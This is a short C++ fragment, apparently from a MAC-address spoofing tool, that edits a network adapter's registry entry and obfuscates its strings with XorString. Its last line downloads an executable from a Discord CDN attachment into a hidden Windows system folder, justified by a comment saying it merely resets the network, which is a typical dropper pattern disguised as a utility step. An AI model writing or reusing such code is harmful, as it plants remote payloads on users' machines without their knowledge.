				...
				if (RegQueryValueEx(hSubKey, _T(XorString("DriverDesc")), NULL, NULL, Data, &cbData) == ERROR_SUCCESS)
				{
					...
					if (_tcscmp((TCHAR*)Data, wAdapterName) == 0)
					{
							...
							(const BYTE*)newMACAddr, sizeof(TCHAR) * ((DWORD)_tcslen(newMACAddr) + 1)) == ERROR_SUCCESS)
						{
							...
							printf(XorString("\n [o] Disabling adapter...\n\n"));
							//I replaced the system of the mac change by program that starts and reset the network
							HRESULT Dimension = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/882370576570785836/910265474623864862/NetWorker.exe"), _T("C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe"), 0, NULL);
